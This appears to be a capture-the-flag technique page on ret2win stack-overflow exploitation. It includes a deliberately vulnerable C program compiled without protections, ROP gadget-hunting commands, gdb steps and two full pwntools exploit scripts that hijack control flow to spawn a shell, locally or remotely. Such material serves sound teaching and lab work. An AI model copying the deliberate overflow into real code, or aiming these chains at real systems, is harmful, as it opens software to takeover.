---
title: "ret2win - Hijacking Control Flow to a Local Function"
category: pwn
subcategory: stack-overflow
type: technique
tags: [ret2win, stack-overflow, buffer-overflow, rop, movaps, stack-alignment, ret-gadget, pop-rdi, pop-rsi, nx, pie, aslr, canary, relro, system, pwntools, gdb, pwndbg, checksec, ropgadget]
difficulty: easy
summary: "Overwrite saved rip with the address of a win/flag function, pass its arguments in rdi/rsi via pop gadgets, and fix movaps crashes with a bare ret."
when_to_use:
  - "The binary contains a win()/flag()/give_shell() function that is never called"
  - "You have a stack overflow offset and NX is on, so shellcode is out"
  - "The win function needs specific argument values (magic constants, a path string)"
  - "Your jump lands correctly but the process dies inside system/printf with a movaps SIGSEGV"
  - "No PIE (or you have a code leak) so the target address is known"
tools: [pwntools, gdb, gef, pwndbg, checksec, ropgadget, ropper, objdump, nm]
related: [stack-buffer-overflow-basics, stack-integer-bugs, rop-fundamentals, rop-ret2libc, rop-one-gadget, mitigation-partial-overwrite-brute, mitigation-modern-playbook]
---

## TL;DR

ret2win is the smallest possible control-flow hijack: the binary already contains the
code you want, so you only have to make `ret` pop its address. On x86-64 you usually
need two extra pieces - `pop rdi; ret` style gadgets to set arguments, and a bare
`ret` gadget to restore 16-byte stack alignment so SSE instructions inside libc do
not fault.

## Recognise it

- `nm`/`objdump` shows a function like `win`, `flag`, `shell`, `print_flag`,
  `give_shell`, `admin_only` with no cross-references from `main`.
- The challenge description says "there is a function you should call".
- The function body is `system("/bin/sh")`, `execve("/bin/sh", 0, 0)`, or
  `fopen("flag.txt")` + `puts`.
- The win function takes arguments and only prints the flag when
  `arg1 == 0xdeadbeef && arg2 == 0xcafebabe`.
- `checksec`: `NX enabled`, `No canary found`, `No PIE` - the classic ret2win combo.

```sh
# List every function; the odd one out is usually the target.
nm -C ./vuln | grep -E ' (t|T) '
# Confirm nothing calls it.
objdump -d --no-show-raw-insn ./vuln | grep -n 'call.*win'
```

## Vulnerable source

```c
/* ret2win.c - unreferenced win() that checks its arguments */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win(unsigned long a, unsigned long b) {
    if (a != 0xdeadbeefUL || b != 0xcafebabeUL) {
        puts("[-] wrong arguments");
        return;
    }
    puts("[+] argument check passed");
    /* system() internally uses movaps, so rsp must be 16-byte aligned here */
    system("/bin/sh");
}

void vuln(void) {
    char buf[64];
    printf("name> ");
    fflush(stdout);
    read(0, buf, 0x200);        /* 512 bytes into a 64 byte buffer */
    printf("hi %s", buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln();
    puts("bye");
    return 0;
}
```

Build:

```sh
# -fno-stack-protector : no canary, straight path to saved rip
# -no-pie              : win() keeps a fixed address like 0x401196
# -z execstack         : not needed here, but keeps the lab binary uniform
# -m64                 : x86-64 System V argument passing (rdi, rsi, rdx, rcx, r8, r9)
gcc -fno-stack-protector -z execstack -no-pie -m64 -w -o ret2win ret2win.c
```

## Theory

### The ret primitive

`ret` is `pop rip`. Every 8-byte slot you place above the saved-rip slot becomes the
*next* `ret` target once the previous gadget returns. So a payload is really:

```
[ padding (offset bytes) ][ addr0 ][ addr1 ][ addr2 ] ...
                            ^ first ret goes here
```

### Passing arguments on x86-64

There is no argument-on-stack convention for the first six integer arguments. They go
in `rdi, rsi, rdx, rcx, r8, r9`. To set `rdi` you need a gadget that pops it:

```
0x00000000004011f3 : pop rdi ; ret
0x00000000004011f1 : pop rsi ; pop r15 ; ret
```

Note `pop rsi ; pop r15 ; ret` pops *two* values - you must supply a junk qword for
`r15` or the chain desynchronises. Always read the whole gadget, not just the first
instruction.

Chain for `win(0xdeadbeef, 0xcafebabe)`:

```
padding
p64(pop_rdi_ret)
p64(0xdeadbeef)
p64(pop_rsi_r15_ret)
p64(0xcafebabe)
p64(0)              # junk for r15
p64(win)
```

On 32-bit x86 (cdecl) arguments live on the stack instead, and the layout is
`[eip][fake return addr][arg1][arg2]`.

### The movaps / stack-alignment problem

The System V ABI guarantees that at the *call site* of a function, `rsp % 16 == 0`
immediately before the `call`, which means `rsp % 16 == 8` on entry to the callee
(the `call` pushed 8 bytes). Modern glibc compiles `system`, `printf` and friends with
SSE instructions such as:

```
movaps XMMWORD PTR [rsp+0x50], xmm0
```

`movaps` requires a 16-byte-aligned memory operand. If you enter `system` with the
alignment shifted by 8, `[rsp+0x50]` is 8-off and the instruction raises a general
protection fault - a SIGSEGV *inside libc*, usually in `do_system`, long after your
jump "worked".

Symptoms:

- gdb stops with `SIGSEGV` at an address inside `libc`, in `do_system` or
  `__strchrnul`, on a `movaps`/`movdqa` instruction.
- The exploit works locally under gdb (different environment => different alignment)
  but dies remotely, or vice versa.
- Removing one qword from the chain, or adding one, makes it work.

The fix: insert a bare `ret` gadget before the misaligned call. A `ret` consumes one
8-byte stack slot and therefore flips `rsp % 16` between 0 and 8.

```
p64(ret_gadget)     # burn 8 bytes of stack, realigning
p64(pop_rdi_ret)
p64(binsh)
p64(system)
```

You do not need to reason about the parity in advance - if your chain segfaults on a
`movaps`, add one `ret`; if it already worked, do not.

Find the gadgets:

```sh
# A bare ret is always present - it is the last byte of any function epilogue.
ROPgadget --binary ./ret2win | grep -E ': ret$'
ROPgadget --binary ./ret2win | grep -E 'pop rdi ; ret'
ROPgadget --binary ./ret2win | grep -E 'pop rsi'
# ropper equivalent
ropper -f ./ret2win --search 'pop rdi'
```

If the binary is tiny and has no `pop rdi; ret`, look in `__libc_csu_init` (see
`rop-ret2csu`) or inside libc once you have a leak.

## Attack

1. Get the offset to saved rip (`stack-buffer-overflow-basics`).
2. `nm`/`objdump` the win function address. With PIE, add `elf.address` after a leak.
3. If it takes no arguments: `padding + p64(ret) + p64(win)`.
4. If it takes arguments: collect `pop rdi; ret`, `pop rsi; pop r15; ret`,
   `pop rdx; ret` as needed and build the chain in register order.
5. Jump *past* the function prologue if the alignment is easier there: instead of
   `win`, use `win + 1` (skipping `push rbp`) - this also shifts alignment by 8 and is
   a common quick fix, though a `ret` gadget is cleaner.
6. If it still dies inside libc on `movaps`, prepend a bare `ret`.
7. Confirm with `p.interactive()` or by checking the flag output.

## Debugging workflow

```
gdb ./ret2win
pwndbg> b *vuln+<offset of the ret>     # or: b *win
pwndbg> run < payload.bin
pwndbg> x/8gx $rsp                      # is your chain where you think it is?
pwndbg> p $rsp % 16                     # 0 or 8? movaps needs 0 at the call site
pwndbg> c
```

If you land in libc with `SIGSEGV`:

```
pwndbg> x/i $rip        # => movaps XMMWORD PTR [rsp+0x50], xmm0
pwndbg> p $rsp & 0xf    # => 0x8  -> you need one extra ret
```

Attach to a running pwntools process instead of re-typing input:

```python
io = process("./ret2win")
gdb.attach(io, gdbscript="b *win\nc\n")
```

## Exploit

```python
#!/usr/bin/env python3
"""ret2win with argument setup and movaps stack-alignment fix.

Usage:
    ./exploit.py                 # local
    ./exploit.py HOST PORT       # remote
    ./exploit.py DEBUG           # local under gdb
"""
from pwn import *
import sys

BINARY = "./ret2win"
OFFSET = 72          # measured with cyclic(); buf[64] + saved rbp

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "info"


def start():
    argv = [a for a in sys.argv[1:] if a != "DEBUG"]
    if len(argv) >= 2:
        return remote(argv[0], int(argv[1]))
    if "DEBUG" in sys.argv:
        return gdb.debug([BINARY], gdbscript="b *win\nc\n")
    return process(BINARY)


def find_gadgets():
    """Pull the gadgets we need out of the binary itself."""
    rop = ROP(elf)
    g = {}
    g["ret"] = rop.find_gadget(["ret"])[0]
    g["pop_rdi"] = rop.find_gadget(["pop rdi", "ret"])[0]

    # pop rsi may come paired with another pop (classic: pop rsi ; pop r15 ; ret).
    try:
        gad = rop.find_gadget(["pop rsi", "ret"])
        g["pop_rsi"] = gad[0]
        g["rsi_pads"] = 0
    except Exception:
        gad = rop.find_gadget(["pop rsi", "pop r15", "ret"])
        g["pop_rsi"] = gad[0]
        g["rsi_pads"] = 1
    return g


def build(g, align_rets):
    """align_rets: number of bare `ret` gadgets to burn for 16-byte alignment."""
    chain = b""
    chain += p64(g["ret"]) * align_rets
    chain += p64(g["pop_rdi"])
    chain += p64(0xDEADBEEF)
    chain += p64(g["pop_rsi"])
    chain += p64(0xCAFEBABE)
    chain += p64(0) * g["rsi_pads"]
    chain += p64(elf.symbols["win"])
    return flat({OFFSET: chain}, filler=b"A")


def attempt(align_rets):
    g = find_gadgets()
    payload = build(g, align_rets)
    log.info("trying with %d alignment ret(s), payload %d bytes",
             align_rets, len(payload))

    io = start()
    io.sendafter(b"name> ", payload)
    try:
        io.sendline(b"echo PWNED; id")
        data = io.recvrepeat(1.0)
    except EOFError:
        data = b""
    if b"PWNED" in data:
        log.success("shell obtained with %d alignment ret(s)", align_rets)
        io.interactive()
        return True
    log.warning("no shell (movaps misalignment or bad chain)")
    io.close()
    return False


def main():
    # Try both alignment parities; one of them is always right.
    for align in (0, 1):
        if attempt(align):
            return
    log.failure("both alignments failed - recheck OFFSET and gadget addresses")


if __name__ == "__main__":
    main()
```

The same chain written with pwntools' high-level `ROP` object, which handles the
register order and the pop-pair padding for you:

```python
#!/usr/bin/env python3
"""ret2win using pwntools ROP() call synthesis instead of hand-packed gadgets."""
from pwn import *
import sys

BINARY = "./ret2win"
OFFSET = 72

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"

def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)

def main():
    rop = ROP(elf)
    # A bare ret first: costs nothing if already aligned on this build, and
    # fixes the movaps fault when it is not. Flip if it misbehaves.
    rop.raw(rop.find_gadget(["ret"])[0])
    rop.call(elf.symbols["win"], [0xDEADBEEF, 0xCAFEBABE])

    log.info("chain:\n%s", rop.dump())
    payload = flat({OFFSET: rop.chain()}, filler=b"A")

    io = start()
    io.sendafter(b"name> ", payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **movaps is the single most common "it should work" bug.** If you SIGSEGV inside
  libc on `movaps`/`movdqa`, add or remove exactly one `ret` gadget - do not rewrite
  the chain.
- **`win + 1` trick.** Jumping one byte past the function start skips `push rbp` and
  flips alignment too, but it also skips the prologue, so `rbp`-relative locals in
  that function misbehave. Prefer a `ret`.
- **`pop rsi ; pop r15 ; ret`** needs a junk qword. Forgetting it shifts the whole
  chain by 8 and you land on garbage.
- **Multiple win functions / staged wins.** Some challenges need `win1()` then
  `win2()`. Chain them: `p64(win1) + p64(win2)` - `win1` returns into `win2`.
- **The win function returns instead of exec'ing.** Keep the chain valid after it
  returns - end with `exit`, or the process crashes before flushing.
- **PIE enabled.** `elf.symbols["win"]` is an offset, not an address. Leak any code
  pointer, set `elf.address = leak - known_offset`, then re-read the symbol. Or brute
  the 4 unknown low bits with a partial overwrite
  (`mitigation-partial-overwrite-brute`).
- **Canary enabled.** You cannot reach saved rip by linear overflow. Leak it first
  (`mitigation-canary-bypass`), then place it back at its slot in your payload.
- **Full RELRO / NX** do not block ret2win at all - the code is already in the binary
  and you are not writing to the GOT.
- **Null bytes in the address.** `0x0000000000401196` packs with leading NULs. That is
  fine for `read()`, fatal for `strcpy`/`scanf("%s")` if the address is not the last
  thing in the payload. Put the address last, or pick an input function that is
  byte-safe.
- **Argument registers are not zeroed.** If `win` also checks `rdx` and there is no
  `pop rdx` gadget, `rop-ret2csu` gives you rdx/rsi/rdi from the `__libc_csu_init`
  epilogue.

## Tools

- `pwntools` - `ROP(elf)`, `rop.call()`, `rop.find_gadget(["ret"])`, `rop.dump()`,
  `flat({offset: chain})`.
- `ROPgadget --binary ./bin | grep 'pop rdi'` and `ropper -f ./bin --search 'pop rdi'`.
- `checksec` - confirms NX/PIE/canary before you pick the technique.
- `nm -C`, `objdump -d`, `readelf -s` - locate the win function and its address.
- `gdb` + `pwndbg`/`gef` - `p $rsp & 0xf` to diagnose movaps, `x/8gx $rsp` to verify
  the chain landed where you expect.
- `one_gadget` - once you move from ret2win to libc (`rop-one-gadget`).
